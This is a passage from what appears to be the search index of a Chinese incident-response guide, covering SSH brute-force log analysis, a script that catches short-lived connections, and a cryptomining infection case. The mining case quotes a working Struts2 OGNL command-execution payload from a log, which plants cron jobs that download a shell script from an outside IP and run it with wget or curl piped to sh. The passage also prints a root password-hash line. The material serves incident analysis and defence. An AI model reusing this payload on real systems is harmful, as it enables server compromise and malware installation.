[root@localhost ~]# awk -F: '$3==0{print $1}' /etc/passwd root 2\u3001\u53ef\u4ee5\u8fdc\u7a0b\u767b\u5f55\u7684\u5e10\u53f7\u4fe1\u606f [root@localhost ~]# awk '/\\$1|\\$6/{print $1}' /etc/shadow root:$6$38cKfZDjsTiUe58V$FP.UHWMObqeUQS1Z2KRj/4EEcOPi.6d1XmKHgK3j3GY9EGvwwBei7nUbbqJC./qK12HN8jFuXOfEYIKLID6hq0::0:99999:7::: \u6211\u4eec\u53ef\u4ee5\u786e\u8ba4\u76ee\u524d\u7cfb\u7edf\u53ea\u6709\u4e00\u4e2a\u7ba1\u7406\u7528\u6237root\u3002 \u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u60f3\u5230\u7684\u662f/var/log/secure\uff0c\u8fd9\u4e2a\u65e5\u5fd7\u6587\u4ef6\u8bb0\u5f55\u4e86\u9a8c\u8bc1\u548c\u6388\u6743\u65b9\u9762\u7684\u4fe1\u606f\uff0c\u53ea\u8981\u6d89\u53ca\u8d26\u53f7\u548c\u5bc6\u7801\u7684\u7a0b\u5e8f\u90fd\u4f1a\u8bb0\u5f55\u4e0b\u6765\u3002 B\u3001\u786e\u8ba4\u653b\u51fb\u60c5\u51b5\uff1a 1\u3001\u7edf\u8ba1\u4e86\u4e0b\u65e5\u5fd7\uff0c\u53d1\u73b0\u5927\u7ea6\u6709126254\u6b21\u767b\u5f55\u5931\u8d25\u7684\u8bb0\u5f55\uff0c\u786e\u8ba4\u670d\u52a1\u5668\u906d\u53d7\u66b4\u529b\u7834\u89e3 [root@localhost ~]# grep -o \"Failed password\" /var/log/secure|uniq -c 126254 Failed password 2\u3001\u8f93\u51fa\u767b\u5f55\u7206\u7834\u7684\u7b2c\u4e00\u884c\u548c\u6700\u540e\u4e00\u884c\uff0c\u786e\u8ba4\u7206\u7834\u65f6\u95f4\u8303\u56f4\uff1a [root@localhost ~]# grep \"Failed password\" /var/log/secure|head -1 Jul 8 20:14:59 localhost sshd[14323]: Failed password for invalid user qwe from 111.13.xxx.xxx port 1503 ssh2 [root@localhost ~]# grep \"Failed password\" /var/log/secure|tail -1 Jul 10 12:37:21 localhost sshd[2654]: Failed password for root from 111.13.xxx.xxx port 13068 ssh2 3\u3001\u8fdb\u4e00\u6b65\u5b9a\u4f4d\u6709\u54ea\u4e9bIP\u5728\u7206\u7834\uff1f [root@localhost ~]# grep \"Failed password\" /var/log/secure|grep -E -o \"(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\"|uniq -c | sort -nr 12622 23.91.xxx.xxx 8942 114.104.xxx.xxx 8122 111.13.xxx.xxx 7525 123.59.xxx.xxx ................... 4\u3001\u7206\u7834\u7528\u6237\u540d\u5b57\u5178\u90fd\u6709\u54ea\u4e9b\uff1f [root@localhost ~]# grep \"Failed password\" /var/log/secure|perl -e 'while($_=<>){ /for(.*?) from/; print \"$1\\n\";}'|uniq -c|sort -nr 9402 root 3265 invalid user oracle 1245 invalid user admin 1025 invalid user user ..................... C\u3001\u7ba1\u7406\u5458\u6700\u8fd1\u767b\u5f55\u60c5\u51b5\uff1a 1\u3001\u767b\u5f55\u6210\u529f\u7684\u65e5\u671f\u3001\u7528\u6237\u540d\u3001IP\uff1a [root@localhost ~]# grep \"Accepted \" /var/log/secure | awk '{print $1,$2,$3,$9,$11}' Jul 9 09:38:09 root 192.168.143.100 Jul 9 14:55:51 root 192.168.143.100 Jul 10 08:54:26 root 192.168.143.100 Jul 10 16:25:59 root 192.168.143.100 ............................ \u901a\u8fc7\u767b\u5f55\u65e5\u5fd7\u5206\u6790\uff0c\u5e76\u672a\u53d1\u73b0\u5f02\u5e38\u767b\u5f55\u65f6\u95f4\u548c\u767b\u5f55IP\u3002 2\u3001\u987a\u4fbf\u7edf\u8ba1\u4e00\u4e0b\u767b\u5f55\u6210\u529f\u7684IP\u6709\u54ea\u4e9b\uff1a [root@localhost ~]# grep \"Accepted \" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more 27 192.168.204.1 \u901a\u8fc7\u65e5\u5fd7\u5206\u6790\uff0c\u53d1\u73b0\u653b\u51fb\u8005\u4f7f\u7528\u4e86\u5927\u91cf\u7684\u7528\u6237\u540d\u8fdb\u884c\u66b4\u529b\u7834\u89e3\uff0c\u4f46\u4ece\u8fd1\u6bb5\u65f6\u95f4\u7684\u7cfb\u7edf\u7ba1\u7406\u5458\u767b\u5f55\u8bb0\u5f55\u6765\u770b\uff0c\u5e76\u672a\u53d1\u73b0\u5f02\u5e38\u767b\u5f55\u7684\u60c5\u51b5\uff0c\u9700\u8981\u8fdb\u4e00\u6b65\u5bf9\u7f51\u7ad9\u670d\u52a1\u5668\u8fdb\u884c\u5165\u4fb5\u6392\u67e5\uff0c\u8fd9\u91cc\u5c31\u4e0d\u518d\u9610\u8ff0\u3002","title":"0x02 \u65e5\u5fd7\u5206\u6790"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC05%E7%AB%A0%EF%BC%9ALinux%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9ASSH%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/#0x04-\u5904\u7406\u63aa\u65bd","text":"\u200b SSH\u66b4\u529b\u7834\u89e3\u4f9d\u7136\u5341\u5206\u666e\u904d\uff0c\u5982\u4f55\u4fdd\u62a4\u670d\u52a1\u5668\u4e0d\u53d7\u66b4\u529b\u7834\u89e3\u653b\u51fb\uff0c\u603b\u7ed3\u4e86\u51e0\u79cd\u63aa\u65bd\uff1a 1\u3001\u7981\u6b62\u5411\u516c\u7f51\u5f00\u653e\u7ba1\u7406\u7aef\u53e3\uff0c\u82e5\u5fc5\u987b\u5f00\u653e\u5e94\u9650\u5b9a\u7ba1\u7406IP\u5730\u5740\u5e76\u52a0\u5f3a\u53e3\u4ee4\u5b89\u5168\u5ba1\u8ba1\uff08\u53e3\u4ee4\u957f\u5ea6\u4e0d\u4f4e\u4e8e8\u4f4d\uff0c\u7531\u6570\u5b57\u3001\u5927\u5c0f\u5199\u5b57\u6bcd\u3001\u7279\u6b8a\u5b57\u7b26\u7b49\u81f3\u5c11\u4e24\u79cd\u4ee5\u4e0a\u7ec4\u5408\u6784\u6210\uff09\u3002 2\u3001\u66f4\u6539\u670d\u52a1\u5668ssh\u9ed8\u8ba4\u7aef\u53e3\u3002 3\u3001\u90e8\u7f72\u5165\u4fb5\u68c0\u6d4b\u8bbe\u5907\uff0c\u589e\u5f3a\u5b89\u5168\u9632\u62a4\u3002","title":"0x04 \u5904\u7406\u63aa\u65bd"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC05%E7%AB%A0%EF%BC%9ALinux%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC2%E7%AF%87%EF%BC%9A%E6%8D%95%E6%8D%89%E7%9F%AD%E8%BF%9E%E6%8E%A5/","text":"\u7b2c2\u7bc7\uff1a\u6355\u6349\u77ed\u8fde\u63a5 \u00b6 0x00 \u524d\u8a00 \u00b6 \u200b \u77ed\u8fde\u63a5\uff08short connnection\uff09\u662f\u76f8\u5bf9\u4e8e\u957f\u8fde\u63a5\u800c\u8a00\u7684\u6982\u5ff5\uff0c\u6307\u7684\u662f\u5728\u6570\u636e\u4f20\u9001\u8fc7\u7a0b\u4e2d\uff0c\u53ea\u5728\u9700\u8981\u53d1\u9001\u6570\u636e\u65f6\uff0c\u624d\u53bb\u5efa\u7acb\u4e00\u4e2a\u8fde\u63a5\uff0c\u6570\u636e\u53d1\u9001\u5b8c\u6210\u540e\uff0c\u5219\u65ad\u5f00\u6b64\u8fde\u63a5\uff0c\u5373\u6bcf\u6b21\u8fde\u63a5\u53ea\u5b8c\u6210\u4e00\u9879\u4e1a\u52a1\u7684\u53d1\u9001\u3002 \u5728\u7cfb\u7edf\u7ef4\u62a4\u4e2d\uff0c\u4e00\u822c\u5f88\u96be\u53bb\u5bdf\u89c9\uff0c\u9700\u8981\u501f\u52a9\u7f51\u7edc\u5b89\u5168\u8bbe\u5907\u6216\u8005\u6293\u5305\u5206\u6790\uff0c\u624d\u80fd\u591f\u53bb\u53d1\u73b0\u3002 0x01 \u5e94\u6025\u573a\u666f \u00b6 \u200b \u67d0\u5929\uff0c\u7f51\u7edc\u7ba1\u7406\u5458\u5728\u51fa\u53e3WAF\u68c0\u6d4b\u5230\u67d0\u53f0\u670d\u52a1\u5668\u4e0d\u65ad\u5411\u9999\u6e2fI\u53d1\u8d77\u8bf7\u6c42 \uff0c\u611f\u89c9\u5f88\u5947\u602a\uff0c\u767b\u5f55\u670d\u52a1\u5668\u6392\u67e5\uff0c\u60f3\u8981\u627e\u5230\u53d1\u8d77\u77ed\u8fde\u63a5\u7684\u8fdb\u7a0b\u3002 0x02 \u65e5\u5fd7\u5206\u6790 \u00b6 \u200b \u767b\u5f55\u670d\u52a1\u5668\u67e5\u770b\u7aef\u53e3\u3001\u8fdb\u7a0b\uff0c\u5e76\u672a\u53d1\u73b0\u53d1\u73b0\u670d\u52a1\u5668\u5f02\u5e38\uff0c\u4f46\u662f\u5f53\u591a\u6b21\u5237\u65b0\u7aef\u53e3\u8fde\u63a5\u65f6\uff0c\u53ef\u4ee5\u67e5\u770b\u8be5\u8fde\u63a5\u3002 \u6709\u65f6\u5019\u4e00\u76f4\u5237\u8fd9\u6761\u547d\u4ee4\u597d\u5341\u51e0\u6b21\u624d\u4f1a\u51fa\u73b0\uff0c\u50cf\u8fd9\u79cd\u7684\u77ed\u8fde\u63a5\u6781\u96be\u6355\u6349\u5230\u5bf9\u5e94\u7684\u8fdb\u7a0b\u548c\u6e90\u6587\u4ef6\u3002 \u624b\u52a8\u6355\u6349\u4f30\u8ba1\u6ca1\u620f\uff0c\u5f88\u96be\u8ffd\u8e2a\uff0c\u4e8e\u662f\u52a8\u624b\u5199\u4e86\u4e00\u6bb5\u5c0f\u811a\u672c\u6765\u6355\u6349\u77ed\u8fde\u63a5\u5bf9\u5e94\u7684pid\u548c\u6e90\u6587\u4ef6\u3002 \u811a\u672c\u6587\u4ef6\u5982\u4e0b\uff1a #!/bin/bash ip=118.184.15.40 i=1 while : do tmp=netstat -anplt|grep $ip|awk -F '[/]' '{print $1}'|awk '{print $7}' #echo $tmp if test -z \"$tmp\" then ((i=i+1)) else for pid in $tmp; do echo \"PID: \"${pid} result=ls -lh /proc/$pid|grep exe echo \"Process: \"${result} kill -9 $pid done break fi done echo \"Total number of times: \"${i} \u8fd0\u884c\u7ed3\u679c\u5982\u4e0b\uff1a \u8dd1\u4e86\u4e09\u6b21\u811a\u672c\uff0c\u53ef\u4ee5\u53d1\u73b0\u77ed\u8fde\u63a5\u6bcf\u6b21\u53d1\u8d77\u7684\u8fdb\u7a0bPid\u4e00\u76f4\u5728\u53d8\uff0c\u4f46\u5df2\u7ecf\u6355\u6349\u5230\u53d1\u8d77\u8be5\u5f02\u5e38\u8fde\u63a5\u7684\u8fdb\u7a0b\u6e90\u6587\u4ef6\u4e3a /usr/lib/nfsiod 0x04 \u5c0f\u7ed3 \u00b6 \u200b \u672c\u6587\u7b80\u5355\u4ecb\u7ecd\u4e86\u77ed\u8fde\u63a5\u4ee5\u53ca\u6355\u6349\u77ed\u8fde\u63a5\u6e90\u6587\u4ef6\u7684\u6280\u5de7\uff0c\u7ad9\u5728\u5b89\u5168\u7ba1\u7406\u5458\u7684\u89d2\u5ea6\uff0c\u5e94\u52a0\u5f3a\u5bf9\u7f51\u7edc\u5b89\u5168\u8bbe\u5907\u7684\u7ba1\u7406\uff0c\u5728\u7f51\u7edc\u5c42\u53bb\u53d1\u73b0\u66f4\u591a\u5728\u7cfb\u7edf\u5c42\u5f88\u96be\u5bdf\u89c9\u7684\u5b89\u5168\u5a01\u80c1\u3002","title":"\u7b2c2\u7bc7\uff1a\u6355\u6349\u77ed\u8fde\u63a5"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC05%E7%AB%A0%EF%BC%9ALinux%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC2%E7%AF%87%EF%BC%9A%E6%8D%95%E6%8D%89%E7%9F%AD%E8%BF%9E%E6%8E%A5/#\u7b2c2\u7bc7\u6355\u6349\u77ed\u8fde\u63a5","text":"","title":"\u7b2c2\u7bc7\uff1a\u6355\u6349\u77ed\u8fde\u63a5"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC05%E7%AB%A0%EF%BC%9ALinux%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC2%E7%AF%87%EF%BC%9A%E6%8D%95%E6%8D%89%E7%9F%AD%E8%BF%9E%E6%8E%A5/#0x00-\u524d\u8a00","text":"\u200b \u77ed\u8fde\u63a5\uff08short connnection\uff09\u662f\u76f8\u5bf9\u4e8e\u957f\u8fde\u63a5\u800c\u8a00\u7684\u6982\u5ff5\uff0c\u6307\u7684\u662f\u5728\u6570\u636e\u4f20\u9001\u8fc7\u7a0b\u4e2d\uff0c\u53ea\u5728\u9700\u8981\u53d1\u9001\u6570\u636e\u65f6\uff0c\u624d\u53bb\u5efa\u7acb\u4e00\u4e2a\u8fde\u63a5\uff0c\u6570\u636e\u53d1\u9001\u5b8c\u6210\u540e\uff0c\u5219\u65ad\u5f00\u6b64\u8fde\u63a5\uff0c\u5373\u6bcf\u6b21\u8fde\u63a5\u53ea\u5b8c\u6210\u4e00\u9879\u4e1a\u52a1\u7684\u53d1\u9001\u3002 \u5728\u7cfb\u7edf\u7ef4\u62a4\u4e2d\uff0c\u4e00\u822c\u5f88\u96be\u53bb\u5bdf\u89c9\uff0c\u9700\u8981\u501f\u52a9\u7f51\u7edc\u5b89\u5168\u8bbe\u5907\u6216\u8005\u6293\u5305\u5206\u6790\uff0c\u624d\u80fd\u591f\u53bb\u53d1\u73b0\u3002","title":"0x00 \u524d\u8a00"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC05%E7%AB%A0%EF%BC%9ALinux%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC2%E7%AF%87%EF%BC%9A%E6%8D%95%E6%8D%89%E7%9F%AD%E8%BF%9E%E6%8E%A5/#0x01-\u5e94\u6025\u573a\u666f","text":"\u200b \u67d0\u5929\uff0c\u7f51\u7edc\u7ba1\u7406\u5458\u5728\u51fa\u53e3WAF\u68c0\u6d4b\u5230\u67d0\u53f0\u670d\u52a1\u5668\u4e0d\u65ad\u5411\u9999\u6e2fI\u53d1\u8d77\u8bf7\u6c42 \uff0c\u611f\u89c9\u5f88\u5947\u602a\uff0c\u767b\u5f55\u670d\u52a1\u5668\u6392\u67e5\uff0c\u60f3\u8981\u627e\u5230\u53d1\u8d77\u77ed\u8fde\u63a5\u7684\u8fdb\u7a0b\u3002","title":"0x01 \u5e94\u6025\u573a\u666f"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC05%E7%AB%A0%EF%BC%9ALinux%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC2%E7%AF%87%EF%BC%9A%E6%8D%95%E6%8D%89%E7%9F%AD%E8%BF%9E%E6%8E%A5/#0x02-\u65e5\u5fd7\u5206\u6790","text":"\u200b \u767b\u5f55\u670d\u52a1\u5668\u67e5\u770b\u7aef\u53e3\u3001\u8fdb\u7a0b\uff0c\u5e76\u672a\u53d1\u73b0\u53d1\u73b0\u670d\u52a1\u5668\u5f02\u5e38\uff0c\u4f46\u662f\u5f53\u591a\u6b21\u5237\u65b0\u7aef\u53e3\u8fde\u63a5\u65f6\uff0c\u53ef\u4ee5\u67e5\u770b\u8be5\u8fde\u63a5\u3002 \u6709\u65f6\u5019\u4e00\u76f4\u5237\u8fd9\u6761\u547d\u4ee4\u597d\u5341\u51e0\u6b21\u624d\u4f1a\u51fa\u73b0\uff0c\u50cf\u8fd9\u79cd\u7684\u77ed\u8fde\u63a5\u6781\u96be\u6355\u6349\u5230\u5bf9\u5e94\u7684\u8fdb\u7a0b\u548c\u6e90\u6587\u4ef6\u3002 \u624b\u52a8\u6355\u6349\u4f30\u8ba1\u6ca1\u620f\uff0c\u5f88\u96be\u8ffd\u8e2a\uff0c\u4e8e\u662f\u52a8\u624b\u5199\u4e86\u4e00\u6bb5\u5c0f\u811a\u672c\u6765\u6355\u6349\u77ed\u8fde\u63a5\u5bf9\u5e94\u7684pid\u548c\u6e90\u6587\u4ef6\u3002 \u811a\u672c\u6587\u4ef6\u5982\u4e0b\uff1a #!/bin/bash ip=118.184.15.40 i=1 while : do tmp=netstat -anplt|grep $ip|awk -F '[/]' '{print $1}'|awk '{print $7}' #echo $tmp if test -z \"$tmp\" then ((i=i+1)) else for pid in $tmp; do echo \"PID: \"${pid} result=ls -lh /proc/$pid|grep exe echo \"Process: \"${result} kill -9 $pid done break fi done echo \"Total number of times: \"${i} \u8fd0\u884c\u7ed3\u679c\u5982\u4e0b\uff1a \u8dd1\u4e86\u4e09\u6b21\u811a\u672c\uff0c\u53ef\u4ee5\u53d1\u73b0\u77ed\u8fde\u63a5\u6bcf\u6b21\u53d1\u8d77\u7684\u8fdb\u7a0bPid\u4e00\u76f4\u5728\u53d8\uff0c\u4f46\u5df2\u7ecf\u6355\u6349\u5230\u53d1\u8d77\u8be5\u5f02\u5e38\u8fde\u63a5\u7684\u8fdb\u7a0b\u6e90\u6587\u4ef6\u4e3a /usr/lib/nfsiod","title":"0x02 \u65e5\u5fd7\u5206\u6790"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC05%E7%AB%A0%EF%BC%9ALinux%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC2%E7%AF%87%EF%BC%9A%E6%8D%95%E6%8D%89%E7%9F%AD%E8%BF%9E%E6%8E%A5/#0x04-\u5c0f\u7ed3","text":"\u200b \u672c\u6587\u7b80\u5355\u4ecb\u7ecd\u4e86\u77ed\u8fde\u63a5\u4ee5\u53ca\u6355\u6349\u77ed\u8fde\u63a5\u6e90\u6587\u4ef6\u7684\u6280\u5de7\uff0c\u7ad9\u5728\u5b89\u5168\u7ba1\u7406\u5458\u7684\u89d2\u5ea6\uff0c\u5e94\u52a0\u5f3a\u5bf9\u7f51\u7edc\u5b89\u5168\u8bbe\u5907\u7684\u7ba1\u7406\uff0c\u5728\u7f51\u7edc\u5c42\u53bb\u53d1\u73b0\u66f4\u591a\u5728\u7cfb\u7edf\u5c42\u5f88\u96be\u5bdf\u89c9\u7684\u5b89\u5168\u5a01\u80c1\u3002","title":"0x04 \u5c0f\u7ed3"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC05%E7%AB%A0%EF%BC%9ALinux%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC3%E7%AF%87%EF%BC%9A%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/","text":"\u7b2c3\u7bc7\uff1a\u6316\u77ff\u75c5\u6bd2 \u00b6 0x00 \u524d\u8a00 \u00b6 \u200b \u968f\u7740\u865a\u62df\u8d27\u5e01\u7684\u75af\u72c2\u7092\u4f5c\uff0c\u5229\u7528\u6316\u77ff\u811a\u672c\u6765\u5b9e\u73b0\u6d41\u91cf\u53d8\u73b0\uff0c\u4f7f\u5f97\u6316\u77ff\u75c5\u6bd2\u6210\u4e3a\u4e0d\u6cd5\u5206\u5b50\u5229\u7528\u6700\u4e3a\u9891\u7e41\u7684\u653b\u51fb\u65b9\u5f0f\u3002\u65b0\u7684\u6316\u77ff\u653b\u51fb\u5c55\u73b0\u51fa\u4e86\u7c7b\u4f3c\u8815\u866b\u7684\u884c\u4e3a\uff0c\u5e76\u7ed3\u5408\u4e86\u9ad8\u7ea7\u653b\u51fb\u6280\u672f\uff0c\u4ee5\u589e\u52a0\u5bf9\u76ee\u6807\u670d\u52a1\u5668\u611f\u67d3\u7684\u6210\u529f\u7387\uff0c\u901a\u8fc7\u5229\u7528\u6c38\u6052\u4e4b\u84dd\uff08EternalBlue\uff09\u3001web\u653b\u51fb\u591a\u79cd\u6f0f\u6d1e\uff08\u5982Tomcat\u5f31\u53e3\u4ee4\u653b\u51fb\u3001Weblogic WLS\u7ec4\u4ef6\u6f0f\u6d1e\u3001Jboss\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u3001Struts2\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u7b49\uff09\uff0c\u5bfc\u81f4\u5927\u91cf\u670d\u52a1\u5668\u88ab\u611f\u67d3\u6316\u77ff\u7a0b\u5e8f\u7684\u73b0\u8c61 \u3002 0x01 \u5e94\u6025\u573a\u666f \u00b6 \u200b \u67d0\u5929\uff0c\u5b89\u5168\u7ba1\u7406\u5458\u5728\u767b\u5f55\u5b89\u5168\u8bbe\u5907\u5de1\u68c0\u65f6\uff0c\u53d1\u73b0\u67d0\u53f0\u7f51\u7ad9\u670d\u52a1\u5668\u6301\u7eed\u5411\u5883\u5916IP\u53d1\u8d77\u8fde\u63a5\uff0c\u4e0b\u8f7d\u75c5\u6bd2\u6e90\uff1a 0x02 \u4e8b\u4ef6\u5206\u6790 \u00b6 A\u3001\u6392\u67e5\u8fc7\u7a0b \u00b6 \u767b\u5f55\u670d\u52a1\u5668\uff0c\u67e5\u770b\u7cfb\u7edf\u8fdb\u7a0b\u72b6\u6001\uff0c\u53d1\u73b0\u4e0d\u89c4\u5219\u547d\u540d\u7684\u5f02\u5e38\u8fdb\u7a0b\u3001\u5f02\u5e38\u4e0b\u8f7d\u8fdb\u7a0b : \u4e0b\u8f7dlogo.jpg\uff0c\u5305\u542b\u811a\u672c\u5185\u5bb9\u5982\u4e0b\uff1a \u5230\u8fd9\u91cc\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u653b\u51fb\u8005\u4e0b\u8f7dlogo.jpg\u5e76\u6267\u884c\u4e86\u91cc\u9762\u4e86shell\u811a\u672c\uff0c\u90a3\u8fd9\u4e2a\u811a\u672c\u662f\u5982\u4f55\u542f\u52a8\u7684\u5462\uff1f \u901a\u8fc7\u6392\u67e5\u7cfb\u7edf\u5f00\u673a\u542f\u52a8\u9879\u3001\u5b9a\u65f6\u4efb\u52a1\u3001\u670d\u52a1\u7b49\uff0c\u5728\u5b9a\u65f6\u4efb\u52a1\u91cc\u9762\uff0c\u53d1\u73b0\u4e86\u6076\u610f\u811a\u672c\uff0c\u6bcf\u9694\u4e00\u6bb5\u65f6\u95f4\u53d1\u8d77\u8bf7\u6c42\u4e0b\u8f7d\u75c5\u6bd2\u6e90\uff0c\u5e76\u6267\u884c \u3002 B\u3001\u6eaf\u6e90\u5206\u6790 \u00b6 \u200b \u5728Tomcat log\u65e5\u5fd7\u4e2d\uff0c\u6211\u4eec\u627e\u5230\u8fd9\u6837\u4e00\u6761\u8bb0\u5f55\uff1a \u5bf9\u65e5\u5fd7\u4e2d\u653b\u51fb\u6e90\u7801\u8fdb\u884c\u6458\u5f55\u5982\u4e0b\uff1a {(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo \"*/20 * * * * wget -O - -q http://5.188.87.11/icons/logo.jpg|sh\\n*/19 * * * * curl http://5.188.87.11/icons/logo.jpg|sh\" | crontab -;wget -O - -q http://5.188.87.11/icons/logo.jpg|sh').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())} \u53ef\u4ee5\u53d1\u73b0\u653b\u51fb\u4ee3\u7801\u4e2d\u7684\u64cd\u4f5c\u4e0e\u5b9a\u65f6\u4efb\u52a1\u4e2d\u5f02\u5e38\u811a\u672c\u4e00\u81f4\uff0c\u636e\u6b64\u63a8\u65ad\u9ed1\u5ba2\u901a\u8fc7Struct \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u5411\u670d\u52a1\u5668\u5b9a\u65f6\u4efb\u52a1\u4e2d\u5199\u5165\u6076\u610f\u811a\u672c\u5e76\u6267\u884c\u3002 C\u3001\u6e05\u9664\u75c5\u6bd2 \u00b6 1\u3001\u5220\u9664\u5b9a\u65f6\u4efb\u52a1: 2\u3001\u7ec8\u6b62\u5f02\u5e38\u8fdb\u7a0b: D\u3001\u6f0f\u6d1e\u4fee\u590d \u00b6 \u200b \u5347\u7ea7struts\u5230\u6700\u65b0\u7248\u672c 0x03 \u9632\u8303\u63aa\u65bd \u00b6 \u200b \u9488\u5bf9\u670d\u52a1\u5668\u88ab\u611f\u67d3\u6316\u77ff\u7a0b\u5e8f\u7684\u73b0\u8c61\uff0c\u603b\u7ed3\u4e86\u51e0\u79cd\u9884\u9632\u63aa\u65bd\uff1a 1\u3001\u5b89\u88c5\u5b89\u5168\u8f6f\u4ef6\u5e76\u5347\u7ea7\u75c5\u6bd2\u5e93\uff0c\u5b9a\u671f\u5168\u76d8\u626b\u63cf\uff0c\u4fdd\u6301\u5b9e\u65f6\u9632\u62a4 2\u3001\u53ca\u65f6\u66f4\u65b0 Windows\u5b89\u5168\u8865\u4e01\uff0c\u5f00\u542f\u9632\u706b\u5899\u4e34\u65f6\u5173\u95ed\u7aef\u53e3 3\u3001\u53ca\u65f6\u66f4\u65b0web\u6f0f\u6d1e\u8865\u4e01\uff0c\u5347\u7ea7web\u7ec4\u4ef6","title":"\u7b2c3\u7bc7\uff1a\u6316\u77ff\u75c5\u6bd2"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC05%E7%AB%A0%EF%BC%9ALinux%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC3%E7%AF%87%EF%BC%9A%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/#\u7b2c3\u7bc7\u6316\u77ff\u75c5\u6bd2","text":"","title":"\u7b2c3\u7bc7\uff1a\u6316\u77ff\u75c5\u6bd2"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC05%E7%AB%A0%EF%BC%9ALinux%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC3%E7%AF%87%EF%BC%9A%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/#0x00-\u524d\u8a00","text":"\u200b \u968f\u7740\u865a\u62df\u8d27\u5e01\u7684\u75af\u72c2\u7092\u4f5c\uff0c\u5229\u7528\u6316\u77ff\u811a\u672c\u6765\u5b9e\u73b0\u6d41\u91cf\u53d8\u73b0\uff0c\u4f7f\u5f97\u6316\u77ff\u75c5\u6bd2\u6210\u4e3a\u4e0d\u6cd5\u5206\u5b50\u5229\u7528\u6700\u4e3a\u9891\u7e41\u7684\u653b\u51fb\u65b9\u5f0f\u3002\u65b0\u7684\u6316\u77ff\u653b\u51fb\u5c55\u73b0\u51fa\u4e86\u7c7b\u4f3c\u8815\u866b\u7684\u884c\u4e3a\uff0c\u5e76\u7ed3\u5408\u4e86\u9ad8\u7ea7\u653b\u51fb\u6280\u672f\uff0c\u4ee5\u589e\u52a0\u5bf9\u76ee\u6807\u670d\u52a1\u5668\u611f\u67d3\u7684\u6210\u529f\u7387\uff0c\u901a\u8fc7\u5229\u7528\u6c38\u6052\u4e4b\u84dd\uff08EternalBlue\uff09\u3001web\u653b\u51fb\u591a\u79cd\u6f0f\u6d1e\uff08\u5982Tomcat\u5f31\u53e3\u4ee4\u653b\u51fb\u3001Weblogic WLS\u7ec4\u4ef6\u6f0f\u6d1e\u3001Jboss\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u3001Struts2\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u7b49\uff09\uff0c\u5bfc\u81f4\u5927\u91cf\u670d\u52a1\u5668\u88ab\u611f\u67d3\u6316\u77ff\u7a0b\u5e8f\u7684\u73b0\u8c61 \u3002","title":"0x00 \u524d\u8a00"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC05%E7%AB%A0%EF%BC%9ALinux%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC3%E7%AF%87%EF%BC%9A%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92/#0x01-\u5e94\u6025\u573a\u666f","text":"\u200b \u67d0\u5929\uff0c\u5b89\u5168\u7ba1\u7406\u5458\u5728\u767b\u5f55\u5b89\u5168\u8bbe\u5907\u5de1\u68c0\u65f6\uff0c\u53d1\u73b0\u67d0\u53f0\u7f51\u7ad9\u670d\u52a1\u5668\u6301\u7eed\u5411\u5883\u5916IP\u53d1\u8d77\u8fde\u63a5\uff0c\u4e0b\u8f7d\u75c5\u6bd2\u6e90\uff1a","title":"0x01 